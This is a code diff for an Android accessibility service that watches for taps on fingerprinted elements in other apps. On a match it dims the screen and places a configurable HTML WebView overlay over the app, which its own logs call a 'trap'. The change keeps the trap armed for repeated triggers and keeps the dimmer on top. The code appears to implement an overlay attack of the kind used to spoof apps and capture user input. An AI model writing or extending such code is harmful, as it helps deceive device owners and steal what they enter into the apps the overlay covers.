@@ -483,31 +483,42 @@ class MyAccessibilityService : AccessibilityService() {
                 if (targetData.isNotEmpty()) {
                     // Pass the EXACT node the user's finger touched to verify Structural Match
                     if (verifyStructuralMatch(event.source, pkg, targetData)) {
-                        val method = statsPrefs.getString("ui_trap_method", "ACC") ?: "ACC"
-                        val html = statsPrefs.getString("ui_trap_html", "") ?: ""
-                        val timeout = statsPrefs.getLong("ui_trap_timeout", 10L)
-                        val dimLevel = statsPrefs.getInt("ui_trap_dim", 20)
+                        val now = System.currentTimeMillis()
+                        val lastTrigger = statsPrefs.getLong("ui_trap_last_trigger", 0L)
                         
-                        DebugLogger.log("UI_TRAP", "✅ FINGERPRINT MATCHED ON TAP! Target: [$targetData]. Deploying trap sequence.")
-                        
-                        // Disable immediately to prevent duplicate triggers
-                        statsPrefs.edit().putBoolean("ui_trap_active", false).apply()
-                        
-                        Handler(Looper.getMainLooper()).post {
-                            // 1. Dim to configured brightness FIRST (Dimmer has FLAG_NOT_TOUCHABLE, it never swallows input)
-                            DimmerManager.applyDim(this@MyAccessibilityService, dimLevel, method)
+                        if (now - lastTrigger > 2000) {
+                            statsPrefs.edit().putLong("ui_trap_last_trigger", now).apply()
                             
-                            // 2. Deploy WebView Overlay immediately AFTER dimming
-                            DynamicUIManager.showOverlay(this@MyAccessibilityService, true, method, html)
-                        }
-                        
-                        // 3. Timeout Failsafe
-                        if (timeout > 0L) {
+                            val method = statsPrefs.getString("ui_trap_method", "ACC") ?: "ACC"
+                            val html = statsPrefs.getString("ui_trap_html", "") ?: ""
+                            val timeout = statsPrefs.getLong("ui_trap_timeout", 10L)
+                            val dimLevel = statsPrefs.getInt("ui_trap_dim", 20)
+                            
+                            DebugLogger.log("UI_TRAP", "✅ FINGERPRINT MATCHED ON TAP! Target: [$targetData]. Deploying trap sequence (Persistent).")
+                            
+                            Handler(Looper.getMainLooper()).post {
+                                // 1. Dim to configured brightness FIRST (Dimmer has FLAG_NOT_TOUCHABLE, it never swallows input)
+                                DimmerManager.applyDim(this@MyAccessibilityService, dimLevel, method)
+                                
+                                // 2. Deploy WebView Overlay immediately AFTER dimming
+                                DynamicUIManager.showOverlay(this@MyAccessibilityService, true, method, html)
+                            }
+                            
+                            // Ensure Dimmer stays on top
                             Handler(Looper.getMainLooper()).postDelayed({
-                                DebugLogger.log("UI_TRAP", "Timeout reached (${timeout}s). Disarming trap and restoring display.")
-                                DynamicUIManager.removeOverlay(this@MyAccessibilityService)
-                                // DimmerManager cleanup is now handled automatically by DynamicUIManager.removeOverlay
-                            }, timeout * 1000)
+                                DimmerManager.pushToFront(this@MyAccessibilityService)
+                            }, 200)
+                            
+                            // 3. Timeout Failsafe
+                            if (timeout > 0L) {
+                                Handler(Looper.getMainLooper()).postDelayed({
+                                    DebugLogger.log("UI_TRAP", "Timeout reached (${timeout}s). Disarming overlay (Trap remains armed).")
+                                    DynamicUIManager.removeOverlay(this@MyAccessibilityService)
+                                    // DimmerManager cleanup is now handled automatically by DynamicUIManager.removeOverlay
+                                }, timeout * 1000)
+                            }
+                        } else {
+                            DebugLogger.log("UI_TRAP_VERBOSE", "Ignored due to 2000ms cooldown.")
                         }
                     }
                 }
